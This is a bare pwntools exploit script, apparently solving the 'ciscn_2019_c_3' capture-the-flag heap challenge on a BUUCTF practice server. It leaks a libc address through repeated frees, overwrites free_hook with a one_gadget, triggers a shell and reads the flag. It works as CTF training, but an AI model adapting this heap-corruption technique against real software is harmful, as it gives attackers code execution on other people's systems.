from pwn import *
filename="./ciscn_2019_c_3"
libc_name="/home/nicholas/glibc-all-in-one/libs/buu_libc6_2.27-3ubuntu1_amd64/libc.so.6"
# io = process(filename)
io = remote('node4.buuoj.cn',28290)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']

def create(name,size):
    io.recvuntil('Command: ')
    io.sendline('1')
    io.recvuntil('size: ')
    io.sendline(str(size))
    io.recvuntil('name: ')
    io.sendline(name)

def show(index):
    io.recvuntil('Command: ')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(index))

def delete(index):
    io.recvuntil('Command: ')
    io.sendline('3')
    io.recvuntil('weapon:')
    io.sendline(str(index))

def debug():
    gdb.attach(io,"brva 0xF81\nbrva 0x120E\n")
    show(0)

def backdoor(num):
    io.recvuntil('Command: ')
    io.sendline('666')
    io.recvuntil('weapon:')
    io.sendline(str(num))

create("aa",0x100)#0
create("bb",0x100)#1
create("cc",0x100)#2
create("dd",0x100)#3
create("ee",0x100)#4  
create("ff",0x100)#5  prot


for i in range(0,5):
    delete(4)
delete(3)
delete(2)
delete(3)
show(3)
io.recvuntil('attack_times: ')
libc_info = int(io.recvuntil('\n',drop=True))
success("libc_info: " + hex(libc_info))
# debug()
libc_base = libc_info - 0x3ebca0
success("libc_base: " + hex(libc_base))

# change 1's fd to 2
for i in range(0,7224//2):
    backdoor(3) # add 2 in 0x100 times

# debug()
og = [0x4f2c5,0x4f322,0x10a38c]
create("/bin/sh\x00",0x100) # 6
create("/bin/sh\x00",0x100) # 7
create(p64(og[1] + libc_base),0x100) # write free_hook with system #8
# debug()
delete(6)

io.sendline("cat flag")

io.interactive()

